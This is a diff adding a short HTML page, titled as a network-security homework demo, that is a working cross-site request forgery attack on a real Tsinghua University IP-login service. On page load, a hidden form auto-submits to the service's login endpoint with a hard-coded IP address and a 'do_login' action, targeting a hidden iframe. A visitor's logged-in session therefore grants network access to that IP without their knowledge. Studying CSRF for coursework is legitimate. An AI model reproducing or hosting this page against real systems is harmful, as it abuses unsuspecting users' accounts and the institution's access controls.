@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>网安作业demo</title>
+</head>
+<body>
+<form method="post" enctype="multipart/form-data" action="https://usereg.tsinghua.edu.cn/ip_login.php"
+      id="crack-ip-form" target="crack_ip_iframe" style="visibility: hidden">
+    <input type="hidden" name="n" value="100">
+    <input type="hidden" name="is_pad" value="1">
+    <input type="hidden" name="type" value="10">
+    <input type="hidden" name="drop" value="0">
+    <input type="hidden" name="action" value="do_login">
+    <input type="text" name="user_ip" placeholder="需要上网的ip地址" value="166.111.139.183">
+    <input id="crack-ip-button" type="submit" value="Crack">
+
+    <iframe hidden src="http://info.tsinghua.edu.cn/minichan/roamaction.jsp?id=389" name="crack_ip_iframe"
+            id="crack-ip-iframe">
+    </iframe>
+</form>
+
+
+</body>
+<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+<script>
+    $(document).ready(function () {
+        $('#crack-ip-button').click();
+    })
+</script>
+</html>
